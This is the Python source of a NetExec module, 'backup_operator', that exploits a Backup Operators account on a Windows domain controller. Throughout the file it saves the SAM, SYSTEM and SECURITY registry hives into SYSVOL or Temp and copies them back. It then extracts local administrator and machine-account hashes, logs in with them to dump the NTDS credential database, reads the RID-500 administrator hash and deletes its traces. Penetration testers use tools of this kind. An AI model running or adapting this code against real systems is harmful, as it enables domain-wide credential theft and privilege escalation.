import contextlib
import re

from impacket.examples.secretsdump import SAMHashes, LSASecrets, LocalOperations
from impacket.smbconnection import SessionError
from impacket.dcerpc.v5 import rrp
from nxc.helpers.misc import CATEGORY, gen_random_string
from nxc.helpers.rpc import NXCRPCConnection

TEMP_DIR = "C:\\Windows\\Temp"
SYSVOL_DIR = "C:\\Windows\\sysvol\\sysvol"


class NXCModule:
    name = "backup_operator"
    description = "Exploit user in backup operator group to dump NTDS @mpgn_x64"
    supported_protocols = ["smb", "winrm"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options

    def options(self, context, module_options):
        """NO OPTIONS"""

    def on_login(self, context, connection):
        if connection.protocol == "winrm":
            BackupOperator_WinRM(context, connection).run()
        else:
            BackupOperator_Smb(context, connection).run()


class BackupOperator:
    """Common state and helpers shared by the protocol classes below."""

    HIVES = ["SAM", "SECURITY", "SYSTEM"]

    def __init__(self, context, connection):
        self.context = context
        self.connection = connection
        self.local_admin = None
        self.local_admin_hash = None
        self.machine_account = None
        self.machine_account_hash = None
        self.cleanup_user = None
        self.cleanup_hash = None

    def _parse_local_hives(self, log_path, skip_lsa=False):
        try:
            def parse_sam(secret):
                self.context.log.highlight(secret)
                if not self.local_admin:
                    first_line = secret.strip().splitlines()[0]
                    fields = first_line.split(":")
                    if len(fields) >= 4:
                        self.local_admin = fields[0]
                        self.local_admin_hash = fields[3]

            def parse_lsa(secret_type, secret):
                self.context.log.highlight(secret)
                if self.machine_account:
                    return
                for line in secret.splitlines():
                    match = re.search(r"aad3b435b51404eeaad3b435b51404ee:([0-9a-f]{32})", line, re.IGNORECASE)
                    if match:
                        self.machine_account_hash = match.group(1)
                        account_name = line.split(":", 1)[0].strip().split("\\")[-1]
                        # "$MACHINE.ACC" has no real name -> derive it from the connection.
                        self.machine_account = account_name if account_name.endswith("$") else f"{self.connection.hostname}$"
                        return

            local_operations = LocalOperations(log_path + "SYSTEM")
            boot_key = local_operations.getBootKey()
            sam_hashes = SAMHashes(log_path + "SAM", boot_key, isRemote=False, perSecretCallback=parse_sam)
            sam_hashes.dump()
            sam_hashes.finish()

            if not skip_lsa:
                lsa_secrets = LSASecrets(log_path + "SECURITY", boot_key, None, isRemote=False, perSecretCallback=parse_lsa)
                lsa_secrets.dumpCachedHashes()
                lsa_secrets.dumpSecrets()
        except Exception as e:
            self.context.log.fail(f"Fail to dump the sam and lsa: {e!s}")

    def _print_cleanup_warning(self, rand_suffix):
        self.context.log.fail(f"Files were not automatically deleted. Please clean up manually: {self.CLEANUP_DIR}\\SECURITY_{rand_suffix}, SAM_{rand_suffix}, SYSTEM_{rand_suffix}")


class BackupOperator_Smb(BackupOperator):
    CLEANUP_DIR = SYSVOL_DIR

    def _ntds_then_cleanup(self, rand_suffix, candidates):
        """Try the NTDS dump with each candidate, then clean the dump files
        with the best credentials we ended up with.
        """
        dump_creds = None
        for username, user_hash in candidates:
            if self._try_dump_ntds(username, user_hash):
                dump_creds = (username, user_hash)
                break

        if dump_creds:
            self.cleanup_user, self.cleanup_hash = self._extract_da_hash()
            if not self.cleanup_user or not self.cleanup_hash:
                self.cleanup_user, self.cleanup_hash = dump_creds

        self._perform_cleanup(rand_suffix)

    def _try_dump_ntds(self, username, user_hash):
        if not username or not user_hash:
            return False
        with contextlib.suppress(Exception):
            self.connection.conn.logoff()
        self.connection.create_conn_obj()
        if self.connection.hash_login(self.connection.domain, username, user_hash):
            try:
                self.context.log.display(f"Dumping NTDS using {username}...")
                self.connection.ntds()
                return True
            except Exception as e:
                self.context.log.fail(f"Fail to dump the NTDS with {username}: {e!s}")
        return False

    def _perform_cleanup(self, rand_suffix):
        if not self.cleanup_user or not self.cleanup_hash:
            self.context.log.fail("Failed to obtain suitable credentials for NTDS dump or cleanup.")
            self._print_cleanup_warning(rand_suffix)
            return

        self.context.log.display(f"Using {self.cleanup_user} to clean up files...")
        with contextlib.suppress(Exception):
            self.connection.conn.logoff()
        self.connection.create_conn_obj()
        if self.connection.hash_login(self.connection.domain, self.cleanup_user, self.cleanup_hash) and self._delete_dump_files(rand_suffix):
            self.context.log.display("Successfully deleted dump files !")
            return
        self._print_cleanup_warning(rand_suffix)

    def _extract_da_hash(self):
        try:
            with open(f"{self.connection.output_filename}.ntds") as f:
                fallback = None
                for line in f:
                    fields = line.strip().split(":")
                    if len(fields) < 4 or not fields[3]:
                        continue
                    da_user = fields[0].split("\\")[-1] if "\\" in fields[0] else fields[0]
                    if fields[1] == "500":
                        return da_user, fields[3]
                    if fallback is None:
                        fallback = (da_user, fields[3])
                if fallback:
                    return fallback
        except Exception as e:
            self.context.log.debug(f"Failed to read NTDS file for cleanup: {e}")
        return None, None

    def run(self):
        rand_suffix = gen_random_string(8)
        log_path = f"{self.connection.output_filename}."
        self.connection.args.share = "SYSVOL"

        # enable remote registry
        self.context.log.display("Triggering RemoteRegistry to start through named pipe...")
        self.connection.trigger_winreg()
        dce = NXCRPCConnection(self.connection).connect(r"\winreg", rrp.MSRPC_UUID_RRP)

        try:
            for hive in ["HKLM\\SAM", "HKLM\\SYSTEM", "HKLM\\SECURITY"]:
                hRootKey, subKey = self._strip_root_key(dce, hive)
                outputFileName = f"\\\\{self.connection.host}\\SYSVOL\\{subKey}_{rand_suffix}"
                self.context.log.debug(f"Dumping {hive}, be patient it can take a while for large hives (e.g. HKLM\\SYSTEM)")
                try:
                    ans2 = rrp.hBaseRegOpenKey(dce, hRootKey, subKey, dwOptions=rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK, samDesired=rrp.KEY_READ)
                    rrp.hBaseRegSaveKey(dce, ans2["phkResult"], outputFileName)
                    self.context.log.highlight(f"Saved {hive} to {outputFileName}")
                except Exception as e:
                    self.context.log.fail(f"Couldn't save {hive}: {e} on path {outputFileName}")
                    self._print_cleanup_warning(rand_suffix)
                    return
        except (Exception, KeyboardInterrupt) as e:
            self.context.log.fail(f"Unexpected error: {e}")
            return
        finally:
            with contextlib.suppress(Exception):
                dce.disconnect()

        # copy remote file to local
        try:
            for hive in self.HIVES:
                self.connection.get_file_single(f"{hive}_{rand_suffix}", log_path + hive)
        except Exception as e:
            self.context.log.fail(f"Couldn't fetch the hives: {e!s}")
            self._print_cleanup_warning(rand_suffix)
            return

        self._parse_local_hives(log_path)
        self._ntds_then_cleanup(rand_suffix, [(self.machine_account, self.machine_account_hash), (self.local_admin, self.local_admin_hash)])

    def _delete_dump_files(self, rand_suffix):
        self.context.log.display(f"Cleaning dump with user {self.cleanup_user} on domain {self.connection.domain}")
        all_deleted = True
        for hive in self.HIVES:
            remote_name = f"{hive}_{rand_suffix}"
            try:
                self.connection.conn.deleteFile("SYSVOL", remote_name)
                self.context.log.debug(f"File {remote_name} deleted successfully via SMB.")
            except SessionError as e:
                if "STATUS_NO_SUCH_FILE" in str(e):
                    self.context.log.debug(f"File {remote_name} already removed or not found.")
                    continue
                if "STATUS_ACCESS_DENIED" in str(e):
                    self.context.log.debug(f"SMB deleteFile for {remote_name} got access denied. Attempting deletion via cmd execution...")
                    try:
                        self.connection.execute(f"del {SYSVOL_DIR}\\{remote_name}")
                        continue
                    except Exception as exec_err:
                        self.context.log.debug(f"Failed to delete {remote_name} via command execution: {exec_err}")
                all_deleted = False
                self.context.log.fail(f"Fail to remove the file {remote_name}: {e!s}")

        if not all_deleted:
            return False
        for hive in self.HIVES:
            remote_name = f"{hive}_{rand_suffix}"
            try:
                if self.connection.conn.listPath("SYSVOL", remote_name):
                    self.context.log.fail(f"File {remote_name} still exists on {SYSVOL_DIR}\\{remote_name}")
                    return False
            except SessionError:
                pass
        return True

    def _strip_root_key(self, dce, key_name):
        sub_key = "\\".join(key_name.split("\\")[1:])
        ans = rrp.hOpenLocalMachine(dce)
        h_root_key = ans["phKey"]
        return h_root_key, sub_key


class BackupOperator_WinRM(BackupOperator):
    CLEANUP_DIR = TEMP_DIR

    def run(self):
        rand_suffix = gen_random_string(8)
        log_path = f"{self.connection.output_filename}."

        # Dos attack prevent: reg save refuses to overwrite an existing file
        # with an interactive "(Yes/No)?" prompt, and the WinRS shell is not
        # a tty - pypsrp never gets an answer and loops the command until
        # the target runs out of memory. Random store names prevent any
        # preexisting file from matching. One reg save per hive: as a plain
        # backup operator reg save is refused on HKLM\SECURITY (SAM and
        # SYSTEM still go through), so one hive failing must not abort the
        # whole dump.
        self.context.log.display("Saving SAM, SECURITY and SYSTEM with reg save (SeBackupPrivilege)...")
        for hive in self.HIVES:
            # a backup operator with WinRM access does not necessarily have
            # a WinRS cmd shell, run the command through a runspace
            self.connection.ps_execute(f"cmd /c 'reg save HKLM\\{hive} {TEMP_DIR}\\{hive}_{rand_suffix}'", True)

        saved_hives = []
        for hive in self.HIVES:
            try:
                self.connection.conn.fetch(f"{TEMP_DIR}\\{hive}_{rand_suffix}", log_path + hive)
                saved_hives.append(hive)
            except Exception as e:
                self.context.log.debug(f"Couldn't fetch the {hive} hive: {e!s}")
        if "SAM" not in saved_hives or "SYSTEM" not in saved_hives:
            self.context.log.fail("Couldn't fetch the SAM or SYSTEM hive")
            self._print_cleanup_warning(rand_suffix)
            return

        skip_lsa = "SECURITY" not in saved_hives
        if skip_lsa:
            self.context.log.display("SECURITY hive not saved (often refused to backup operators over reg save): skipping LSA secrets")
        self._parse_local_hives(log_path, skip_lsa=skip_lsa)

        # no NTDS dump over winrm: the smb chain escalates to the machine
        # account for a DCSync, and there is no winrm equivalent - shadow
        # copies and vssadmin need an administrator
        self.context.log.display("NTDS cannot be dumped as a backup operator over winrm")

        if self._delete_dump_files(rand_suffix):
            self.context.log.display("Successfully deleted dump files !")
        else:
            self._print_cleanup_warning(rand_suffix)

    def _delete_dump_files(self, rand_suffix):
        # clean up our own dump files in the same session: dir lists what is
        # left after the delete, no output means the files are gone
        files = " ".join(f"{TEMP_DIR}\\{hive}_{rand_suffix}" for hive in self.HIVES)
        leftover = self.connection.ps_execute(f"cmd /c 'del {files} 2>nul & dir /b {files} 2>nul'", True) or ""
        return not leftover.strip()
